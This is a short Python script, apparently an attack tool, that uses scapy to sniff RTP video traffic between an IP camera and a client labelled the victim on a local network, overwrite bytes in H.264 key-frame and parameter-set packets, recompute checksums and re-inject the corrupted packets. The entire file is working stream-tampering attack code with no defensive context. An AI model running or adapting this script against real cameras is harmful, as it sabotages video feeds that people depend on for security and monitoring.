import subprocess
from scapy.all import sniff, send, IP, UDP, Raw


RTP_PORT_CAMERA = 48600  
RTP_PORT_CLIENT = 58530   
IFACE = "en0"             

IP_CAMERA = "192.168.0.81"
IP_VICTIM = "192.168.0.162"

def corrupt_rtp_packet(packet):
    print(".", end="", flush=True)
    # filter
    if UDP in packet and Raw in packet and packet[UDP].sport == RTP_PORT_CAMERA:
        
        original_payload = packet[Raw].load 
        
        # Check NAL unit type, looking for I-Frames
        try:
            nal_type = original_payload[0] & 0x1f
        except IndexError:
            # Forward empty payloads safely
            send(packet, verbose=False, iface=IFACE)
            return

        # Target I-Frames
        if nal_type in [5, 7, 8]:
            
           
            corrupt_block = b'\xAA\xBB\xCC\xDD\xEE\xFF\x00\x11' # 8 bytes of random stuff to corrupt
            
            # Corrupt the payload it self by including our corrupt block
            if len(original_payload) > 13:
                corrupted_data = original_payload[:5] + corrupt_block + original_payload[13:]
                
                # Rebuild the packet with the corrupted payload
                new_packet = packet.copy()
                new_packet[Raw].load = corrupted_data 
                
                # delete the checksums so that they are recalculated given the new payload
                del new_packet[IP].chksum
                del new_packet[UDP].chksum
                
                # Send the corrupted packet back into the stream
                send(new_packet, verbose=False, iface=IFACE)
                print(f"INJECTED: Fuzzed critical NAL Type {nal_type} packet.")
                return 

    # If we dont care about the packet, just forward 
    send(packet, verbose=False, iface=IFACE)

print("Starting RTP Corruption Sniffer on " + IFACE)
sniff(iface=IFACE, filter=f"udp and host {IP_CAMERA} and host {IP_VICTIM}", prn=corrupt_rtp_packet)
